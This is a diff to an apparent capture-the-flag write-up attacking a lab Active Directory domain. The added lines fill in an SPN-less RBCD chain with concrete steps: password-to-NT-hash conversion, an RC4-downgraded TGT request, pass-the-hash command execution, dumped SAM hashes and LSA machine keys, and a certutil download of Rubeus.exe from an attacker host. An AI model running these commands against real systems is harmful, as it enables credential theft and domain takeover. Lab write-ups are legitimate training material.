@@ -117,6 +117,7 @@ http://jollyroger.pirates.brb:8080/scan/IT_Procedures.docx \
     | grep -E '^(Username|Temp Password):' \
     | awk -F': *' '{gsub(/^ +| +$/,"",$2); print $2}' \
     | paste - - | sed 's/\t/:/'
+
 blackbeard:TempPass2024!@#
 ruby:NewHire789$%^
 jack:Welcome123!&*
@@ -460,14 +461,27 @@ The new line is ours: `morgan` ➜ `Resource-Based Constrained` ➜ `JOLLYROGER$
 
 RBCD is supposed to be a controlled delegation mechanism — the resource decides who can impersonate on it, and the impersonation is scoped to the service. On `JOLLYROGER`, the service we care about is CIFS, the file share, because a CIFS ticket is a tunnel onto the host. The S4U2Self step asks the KDC for a service ticket for `morgan` to `cifs/JOLLYROGER.PIRATES.BRB`, and the S4U2Proxy step asks the KDC to issue a proxy ticket impersonating `Administrator` on that same service — the proxy being allowed because `morgan` now holds the RBCD right on `JOLLYROGER$`.
 
-We already hold `morgan`'s TGT somewhere earlier in the session — the notes don't show the mint explicitly, but `morgan.ccache` is on disk when the relay fires, and that TGT is what makes the rest of the chain legible. Its session key is the long-term key we want `morgan`'s NT hash to become:
+To make the rest of the chain legible, we need to mint `morgan`'s TGT. But we can't just request it the standard way.
+
+> **Note:** Supplying a plaintext password yields an AES256 TGT with a 32-byte session key, which breaks our chain. We authenticate using *only* the NT hash to force an RC4 downgrade, giving us the exact 16-byte session key we need.
+
+```zsh
+➜ pypykatz crypto nt 'Entry369@!*'
+52bb96aecbcfe774799a60da76212a54
+
+➜ nxc smb blackpearl.pirates.brb \
+    -u 'morgan' -H '52bb96aecbcfe774799a60da76212a54' \
+    --generate-tgt morgan.ccache
+```
+
+Its session key is the long-term key we want `morgan`'s NT hash to become:
 
 ```zsh
 ➜ describeTicket.py morgan.ccache | grep 'Ticket Session Key'
 [*] Ticket Session Key            : b03b513de8ffc8ed466601a40f0fb044
 ```
 
-`morgan`'s NT hash at the time of the change is `52bb96aecbcfe774799a60da76212a54` — the hash the DC currently has on file for `morgan` (from the SAM dump or a credential the session already recovered; the notes show it as the authenticator for the change call). We use it to authenticate the password change RPC, and tell the DC to replace `morgan`'s NT hash with the session key we already hold:
+`morgan`'s NT hash at the time of the change is `52bb96aecbcfe774799a60da76212a54` — the hash the DC currently has on file for `morgan`. We use it to authenticate the password change RPC, and tell the DC to replace `morgan`'s NT hash with the session key we already hold:
 
 ```zsh
 ➜ nxc smb blackpearl.pirates.brb \
@@ -505,14 +519,33 @@ nxc smb jollyroger.pirates.brb \
 ...[snip]...
 SMB         jollyroger.pirates.brb 445    JOLLYROGER       [+] PIRATES.BRB\Administrator through S4U+U2U with morgan (Pwn3d!)
 SMB         jollyroger.pirates.brb 445    JOLLYROGER       [*] Dumping SAM hashes
-...[snip: local accounts]...
+SMB         jollyroger.pirates.brb 445    JOLLYROGER       Administrator:500:aad3b435b51404eeaad3b435b51404ee:4dae99ecd2b1b0bc6cc48538ea284347:::
+...
+SMB         jollyroger.pirates.brb 445    JOLLYROGER       pirate1:1001:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
+SMB         jollyroger.pirates.brb 445    JOLLYROGER       pirate2:1002:aad3b435b51404eeaad3b435b51404ee:5ca58736d81038078d384c62d1cf70c0:::
+SMB         jollyroger.pirates.brb 445    JOLLYROGER       pirate3:1003:aad3b435b51404eeaad3b435b51404ee:cfb5a4babcb0e75776d1efcc1e3cd03c:::
+...
 SMB         jollyroger.pirates.brb 445    JOLLYROGER       [*] Dumping LSA secrets
 SMB         jollyroger.pirates.brb 445    JOLLYROGER       PIRATES\JOLLYROGER$:aes256-cts-hmac-sha1-96:949584026e4d0f1588e2dafda8defd278b3d0b6ba0489618ee6821f0e8698338
-...[snip]...
+...
 SMB         jollyroger.pirates.brb 445    JOLLYROGER       PIRATES\JOLLYROGER$:aad3b435b51404eeaad3b435b51404ee:cb6df3097b82ef7eccfb287a8fd103dc:::
 ```
 
-The SAM dump gives us the local accounts on `JOLLYROGER` — the local Administrator, the pirates, vagrant. The LSA dump gives us something more useful for the rest of the chain: `JOLLYROGER$`'s machine account keys, in three forms — AES256, AES128, and DES. A domain-joined machine account authenticates to the domain with a password derived from its SID and a rotation schedule, stored locally as these keys. Possess them, and you can authenticate as the machine account anywhere the domain trusts it.
+The SAM dump gives us the local accounts on `JOLLYROGER` — the local Administrator, the pirates, etc..
+
+```zsh
+➜ nxc smb jollyroger.pirates.brb \
+    -u 'administrator' -H '4dae99ecd2b1b0bc6cc48538ea284347' --local-auth \
+    -x 'type C:\Flag\flag.txt'
+
+...[snip]...
+SMB         192.168.10.11   445    JOLLYROGER       brb{c4e5da3432481f8b0eb6ba4a86e5d4b9}
+SMB         192.168.10.11   445    JOLLYROGER       Congratulations! You've compromised JOLLYROGER via NTLMv1 relay and SPN-less RBCD!
+```
+
+That's **flag four**.
+
+The LSA dump gives us something more useful for the rest of the chain: `JOLLYROGER$`'s machine account keys, in three forms — AES256, AES128, and DES. A domain-joined machine account authenticates to the domain with a password derived from its SID and a rotation schedule, stored locally as these keys. Possess them, and you can authenticate as the machine account anywhere the domain trusts it.
 
 The machine account's NT hash and plain password are also in the LSA dump:
 
@@ -738,6 +771,10 @@ The final move before the ghost ship is the `QUEENREV$` TGT. SYSTEM owns the Ker
 
 ```powershell
 PS > certutil -urlcache -f -split http://192.168.10.131/Rubeus.exe Rubeus.exe
+
+PS > .\rubeus.exe triage
+...[snip]...
+ | 0x3e4   | queenrev$ @ PIRATES.BRB | krbtgt/PIRATES.BRB                      | 9/15/2026 1:29:23 PM |
 
 PS > .\rubeus.exe tgtdeleg /nowrap
 [*] Action: Request Fake Delegation TGT (current user)
